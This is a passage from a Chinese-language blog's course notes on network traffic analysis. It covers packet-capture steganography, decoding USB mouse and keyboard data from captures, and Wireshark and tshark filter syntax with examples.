&quot;</span><span class="variable">$7&#125;</span>&#x27;</span><br></pre></td></tr></table></figure>





<h2 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h2><p><strong>数据包隐写术</strong> </p>
<p>数据包隐写术，就是将所要传达的信息和文件，以流量包的形式下发给参赛选手，参赛选手要从流量包中自行提取出所需要的文件或者相关内容进行解题。</p>
<p>数据包隐写术目前两种考察行为: </p>
<p>1、flag或者关键信息直接隐藏在流量包中 </p>
<p>2、flag相关文件隐藏在流量包中，需要分离文件</p>
<p>相关工具或者命令: Wireshark、binwalk、strings、foremost</p>
<hr>
<p><strong>USB协议分析</strong></p>
<p><a target="_blank" rel="noopener" href="http://www.usb.org/developers/hidpage/Hut1_12v2.pdf">http://www.usb.org/developers/hidpage/Hut1_12v2.pdf</a></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220801214148349.png" alt="image-20220801214148349"></p>
<p>每一个数据包的数据区有四个字节，第一个字节代表按键，当取0x00时，代表没有按键、为0x01时，代表按左键，为0x02时，代表当前按键为右键。第二个字节可以看成是一个signed byte类型，其最高位为符号位，当这个值为正时，代表鼠标水平右移多少像素，为负时，代表水平左移多少像素。第三个字节与第二字节类似，代表垂直上下移动的偏移。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/WangYihang/UsbMiceDataHacker">https://github.com/WangYihang/UsbMiceDataHacker</a></p>
<hr>
<p><strong>键盘协议</strong></p>
<p>键盘数据包的数据长度为8个字节，击键信息集中在第3个字节根据data值与具体键位的对应关系可从数据包恢复出键盘的案件信息</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220801214239988.png" alt="image-20220801214239988"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220801214257421.png" alt="image-20220801214257421"></p>
<p><a target="_blank" rel="noopener" href="https://github.com/WangYihang/UsbKeyboardDataHacker">https://github.com/WangYihang/UsbKeyboardDataHacker</a></p>
<p>使用tshark命令行工具，可以将 leftover capture data单独提取出来</p>
<p><code>tshark -r usb1.pcap -T fields -e usb.capdata &gt; usbdata.txt</code></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220801214338418.png" alt="image-20220801214338418"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220801214352911.png" alt="image-20220801214352911"></p>
<hr>
<p><strong>Wireshark—过滤语法</strong></p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">语法：Protocol.String <span class="number">1</span>.String <span class="number">2</span> Comparison operator ValueLogical OperationsOther expression</span><br><span class="line"></span><br><span class="line">例子：http.request.method ==<span class="string">&quot;GET”</span></span><br><span class="line">Protocol（协议）ether，fddi， ip，arp，rarp，decnet，lat， sca，moprc，mopdl， tcp ， udp 等，如果没指明协议类型，则默认为捕捉所有支持的协议。</span><br><span class="line"></span><br><span class="line">string1和string2是可选的</span><br><span class="line"></span><br><span class="line">比较运算符</span><br><span class="line"></span><br><span class="line">==	<span class="meta">#等于		 ip.src==10.0.0.5</span></span><br><span class="line">!= 	<span class="meta">#不等于	 ip.src!=10.0.0.5</span></span><br><span class="line">&gt; 	<span class="meta">#大于     	 frame.len &gt; 10</span></span><br><span class="line">&lt; 	<span class="meta">#小于		 frame.len &lt; 128</span></span><br><span class="line">&gt;= 	<span class="meta">#大于等于  frame.len &gt;= 0x100</span></span><br><span class="line">&lt;= 	<span class="meta">#小于等于  frame.len &lt;= 0x20</span></span><br><span class="line">、</span><br><span class="line"></span><br><span class="line">ip.addr == <span class="number">192.168</span>.<span class="number">5.231</span>	<span class="meta">#显示来自192.168.5.231 的流量包</span></span><br><span class="line">ip.src != <span class="number">192.168</span>.<span class="number">5.231</span> or ip.dst != <span class="number">192.168</span>.<span class="number">5.231</span>  <span class="meta">#显示来自除192.168.5.231 之外i的流量包</span></span><br><span class="line">ip.src == <span class="number">192.168</span>.<span class="number">5.0</span>/<span class="number">24</span> 显示来自<span class="number">192.168</span>.<span class="number">5</span>.网段的封包 </span><br><span class="line">tcp.port == <span class="number">25</span> 显示来源或目的TCP端口号为<span class="number">25</span>的封包。</span><br><span class="line">tcp.dstport == <span class="number">25</span> 显示目的TCP端口号为<span class="number">25</span>的封包。</span><br><span class="line">http.request.method== <span class="string">&quot;POST&quot;</span> 显示post请求方式的http封包。</span><br><span class="line">http.host == <span class="string">&quot;tracker.1ting.com&quot;</span> 显示请求的域名为tracker.<span class="number">1</span>ting.com的http封包。</span><br><span class="line">tcp.flags.syn == <span class="number">0</span>x02 显示包含TCP SYN标志的封包。</span><br></pre></td></tr></table></figure>

<hr>
<p><strong>内容过滤语法</strong></p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">深度字符串匹配</span><br><span class="line"></span><br><span class="line"><span class="keyword">contains</span> ：协议，字段或切片是否包含值</span><br><span class="line"></span><br><span class="line">示例</span><br><span class="line"></span><br><span class="line">tcp <span class="keyword">contains</span> <span class="string">&quot;http&quot;</span> 显示payload中包含<span class="string">&quot;http&quot;</span>字符串的tcp封包。</span><br><span class="line"><span class="keyword">http</span>.request.uri <span class="keyword">contains</span> <span class="string">&quot;online&quot;</span> 显示请求的uri包含<span class="string">&quot;online&quot;</span>的<span class="keyword">http</span>封包。</span><br><span class="line"></span><br><span class="line">过滤中函数的使用（<span class="built_in">upper</span>、<span class="built_in">lower</span>）</span><br><span class="line">示例：<span class="built_in">upper</span>(<span class="keyword">http</span>.request.uri) <span class="keyword">contains</span> <span class="string">&quot;ONLINE&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220801214606430.png" alt="image-20220801214606430"></p>
<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">http显示过滤</span><br><span class="line">1.1 http方法</span><br><span class="line">http.ssl_port    #https方法发送请求数据</span><br><span class="line">http.request.method == “GET” #通过GET方法请求数据</span><br><span class="line">http.request.method == “POST” #通过POST方法请求数据</span><br><span class="line">http.request.full_uri contains &quot;png&quot;    #通过请求中包含” png &quot;名字的url</span><br><span class="line">http contains “GET” #通过请求中包含GET</span><br><span class="line">http contains “HTTP/1.” #通过请求中包含“HTTP/1.”</span><br><span class="line">1.2 http 显示请求</span><br><span class="line">1 GET包</span><br><span class="line">http.request.method == “GET” &amp;&amp; http contains “Host: ”</span><br><span class="line">http.request.method == “GET” &amp;&amp; http contains “User-Agent: ”</span><br><span class="line">2 POST包</span><br><span class="line">http.request.method == “POST” &amp;&amp; http contains “Host: ”</span><br><span class="line">http.request.method == “POST” &amp;&amp; http contains “User-Agent: ”</span><br><span class="line">3 响应包</span><br><span class="line">http contains “HTTP/1.1 200 OK” &amp;&amp; http contains “Content-Type: ”</span><br><span class="line">http contains “HTTP/1.0 200 OK” &amp;&amp; http contains “Content-Type: ”</span><br><span class="line"></span><br><span class="line">2 端口过滤</span><br><span class="line">2.1 仅显示80端口的流量</span><br><span class="line">tcp.port==80 || udp.port==80     #显示tcp端口为80的流量（包括tcp和udp)</span><br><span class="line">tcp.port &gt;= 1 and tcp.port &lt;= 80    #显示tcp端口在1-80之间的流量</span><br><span class="line">tcp.dstport == 8080    #只显tcp协议的目标端口8080</span><br><span class="line">tcp.srcport == 8080    #只显tcp协议的源端口8080</span><br><span class="line">2.2 FTP/telnet默认的端口</span><br><span class="line">tcp.port == 23</span><br><span class="line">tcp.port&gt;=20 and tcp.port&lt;=30</span><br><span class="line">2.3 常见的web应用端口</span><br><span class="line"></span><br><span class="line">tcp.port=7001        #WebLogic，默认的端口号为7001</span><br><span class="line">tcp.port=9080 #WebSphere应用程序，默认的端口号为9080</span><br><span class="line">tcp.port=9090 #WebSphere管理工具，默认的端口号为9090</span><br><span class="line">tcp.port=8080        #JBOSS，默认的端口号为8080</span><br><span class="line">tcp.port-8080 #TOMCAT，默认的端口号为8080</span><br><span class="line"></span><br><span class="line">3 主机过滤</span><br><span class="line">ip.addr == 10.202.188.188           # 仅显示10.202.188.188的流量</span><br><span class="line"></span><br><span class="line">ip.src ==10.202.188.188              #仅显示目的为10.202.188.188的流量</span><br><span class="line"></span><br><span class="line">ip.dst ==10.202.188.188              #仅显示来源为10.202.188.188的流量</span><br><span class="line"></span><br><span class="line">ip.addr !=10.202.188.188             #显示除10.202.188.188外的流量</span><br><span class="line"></span><br><span class="line">4 协议过滤</span><br><span class="line">4.1 arp 协议流量</span><br><span class="line"></span><br><span class="line"> arp     #显示接口中所有的arp协议</span><br><span class="line"></span><br><span class="line">ip.addr =10.202.188.188 and arp #仅显示主机10.202.188.188的arp请求。</span><br><span class="line"></span><br><span class="line">arp.src.proto_ipv4 #显示源协议为IPv4的地址请求。</span><br><span class="line"></span><br><span class="line">类似正则表达式</span><br><span class="line"><span class="symbol">\d</span>          0-9的数字</span><br><span class="line"><span class="symbol">\D</span>          <span class="symbol">\d</span>的补集（以所以字符为全集，下同），即所有非数字的字符</span><br><span class="line"><span class="symbol">\w</span>          单词字符，指大小写字母、0-9的数字、下划线</span><br><span class="line"><span class="symbol">\W</span>          <span class="symbol">\w</span>的补集</span><br><span class="line"><span class="symbol">\s</span>          空白字符，包括换行符<span class="symbol">\n</span>、回车符<span class="symbol">\r</span>、制表符<span class="symbol">\t</span>、垂直制表符<span class="symbol">\v</span>、换页符<span class="symbol">\f</span></span><br><span class="line"><span class="symbol">\S</span>          <span class="symbol">\s</span>的补集</span><br><span class="line">.          除换行符<span class="symbol">\n</span>外的任意字符。 在Perl中，“.”可以匹配新行符的模式被称作“单行模式”</span><br><span class="line">.*       匹配任意文本，不包括回车(<span class="symbol">\n</span>)? 。 而，[0x00-0xff]*        匹配任意文本,包括<span class="symbol">\n</span></span><br><span class="line">[…]          匹配[]内所列出的所有字符</span><br><span class="line">[^…]          匹配非[]内所列出的字符</span><br><span class="line">定位字符</span><br><span class="line">^          表示其后的字符必须位于字符串的开始处</span><br><span class="line">$          表示其前面的字符必须位于字符串的结束处</span><br><span class="line">重复</span><br><span class="line">&#123;n&#125;          匹配前面的字符n次</span><br><span class="line">&#123;n,&#125;          匹配前面的字符n次或多于n次</span><br><span class="line">&#123;n,m&#125;          匹配前面的字符n到m次</span><br><span class="line">?          匹配前面的字符0或1次</span><br><span class="line">+          匹配前面的字符1次或多于1次</span><br><span class="line">*          匹配前面的字符0次或式于0次</span><br><span class="line"></span><br><span class="line">搜索按条件过滤udp的数据段payload（数字8是表示udp头部有8个字节，数据部分从第9个字节开始udp[8:]）</span><br><span class="line">udp[8]==14        (14是十六进制0x14)匹配payload第一个字节0x14的UDP数据包</span><br><span class="line">udp[8:2]==14:05 可以udp[8:2]==1405，且只支持2个字节连续，三个以上须使用冒号：分隔表示十六进制。 (相当于 udp[8]==14 and udp[9]==05,1405是0x1405)</span><br><span class="line">udp[8:3]==22:00:f7 但是不可以udp[8:3]==2200f7</span><br><span class="line">udp[8:4]==00:04:00:2a，匹配payload的前4个字节0x0004002a</span><br><span class="line">而udp contains 7c:7c:7d:7d 匹配payload中含有0x7c7c7d7d的UDP数据包，不一定是从第一字节匹配。</span><br><span class="line">udp[8:4] matches “<span class="symbol">\\</span>x14<span class="symbol">\\</span>x05<span class="symbol">\\</span>x07<span class="symbol">\\</span>x18″</span><br><span class="line">udp[8:] matches “^<span class="symbol">\\</span>x14<span class="symbol">\\</span>x05<span class="symbol">\\</span>x07<span class="symbol">\\</span>x18<span class="symbol">\\</span>x14″</span><br><span class="line"></span><br><span class="line">搜索按条件过滤tcp的数据段payload（数字20是表示tcp头部有20个字节，数据部分从第21个字节开始tcp[20:]）</span><br><span class="line">tcp[20:] matches “^GET [ -~]*HTTP/1.1<span class="symbol">\\</span>x0d<span class="symbol">\\</span>x0a”</span><br><span class="line">等同http matches “^GET [ -~]*HTTP/1.1<span class="symbol">\\</span>x0d<span class="symbol">\\</span>x0a”</span><br><span class="line">tcp[20:] matches “^GET (.*?)HTTP/1.1<span class="symbol">\\</span>x0d<span class="symbol">\\</span>x0a”</span><br><span class="line">tcp[20:] matches “^GET (.*?)HTTP/1.1<span class="symbol">\\</span>x0d<span class="symbol">\\</span>x0a[<span class="symbol">\\</span>x00-<span class="symbol">\\</span>xff]*Host: (.*?)pplive(.*?)<span class="symbol">\\</span>x0d<span class="symbol">\\</span>x0a”</span><br><span class="line">tcp[20:] matches “^GET (.*?)HTTP/1.1<span class="symbol">\\</span>x0d<span class="symbol">\\</span>x0a[<span class="symbol">\\</span>x00-<span class="symbol">\\</span>xff]*Host: “</span><br><span class="line">tcp[20:] matches “^POST / HTTP/1.1<span class="symbol">\\</span>x0d<span class="symbol">\\</span>x0a[<span class="symbol">\\</span>x00-<span class="symbol">\\</span>xff]*<span class="symbol">\\</span>x0d<span class="symbol">\\</span>x0aConnection: Keep-Alive<span class="symbol">\\</span>x0d<span class="symbol">\\</span>x0a<span class="symbol">\\</span>x0d<span class="symbol">\\</span>x0a”</span><br></pre></td></tr></table></figure>

<hr>
<p><strong>tshark</strong></p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">用Tshark读取文件</span><br><span class="line">如果有要处理的pcap文件，则可以使用“-r”命令。也可以通过“head”（仅显示指定数量的输出行）或“less”（一次显示一整页输出）来输出到屏幕上，例如：tshark -r interesting-packets<span class="number">.</span>pcap | head默认情况下，“head”只会显示前<span class="number">10</span>行，但您可以根据需要对其进行修改，</span><br><span class="line"></span><br><span class="line">使用Tshark过滤流量</span><br><span class="line">当我们在查看一个pcap文件时，通常我们会寻找某些特定特征。例如，我们需要查找与某些<span class="built_in">IP</span>地址或服务相关的所有流量。我们可以使用捕获过滤器。但如果我们使用Wireshark，Wireshark捕获过滤器与tshark的工作方式略有不同。Tshark实际上使用Wireshark Display Filter语法进行捕获和显示。tshark捕获过滤器的语法是：&lt;field&gt;&lt;operator&gt;&lt;value&gt;举个栗子：</span><br><span class="line"><span class="built_in">ip</span><span class="number">.</span>dst==<span class="number">192.168</span><span class="number">.1</span><span class="number">.10</span> </span><br><span class="line"><span class="built_in">ip</span><span class="number">.</span>proto==<span class="number">17</span> </span><br><span class="line">tcp<span class="number">.</span>flags<span class="number">.</span>reset!=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">选择Tshark输出哪些字段</span><br><span class="line">使用命令“-T fields”来标识我们希望指定要查看的确切字段，而不是显示默认信息。然后可以使用“-e”来标识要打印的特定字段。下面一个只打印源和目标<span class="built_in">IP</span>地址的例子：</span><br><span class="line">tshark -r interesting-host<span class="number">.</span>pcap -T fields -e <span class="built_in">ip</span><span class="number">.</span>src -e <span class="built_in">ip</span><span class="number">.</span>dst <span class="built_in">ip</span><span class="number">.</span>dst==<span class="number">192.168</span><span class="number">.1</span><span class="number">.10</span> </span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220801214906900.png" alt="image-20220801214906900"></p>
<h1 id="安全设备见pdf"><a href="#安全设备见pdf" class="headerlink" title="安全设备见pdf"></a>安全设备见pdf</h1>
    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/HW/" rel="tag"># HW</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2022/05/13/WeChat%E5%B0%8F%E7%A8%8B%E5%BA%8F/" rel="prev" title="WeChat小程序">
                  <i class="fa fa-chevron-left"></i> WeChat小程序
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2022/07/01/xss%E4%B8%8Ecsrf/" rel="next" title="xss与csrf">
                  xss与csrf <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">CJ</span>
</div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="Symbols count total">492k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">7:28</span>
  </span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a>
  </div><script color="0,0,255" opacity="0.5" zIndex="-1" count="99" src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js"></script>

    </div>
  </footer>

  
  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>

  





  





</body>
</html>
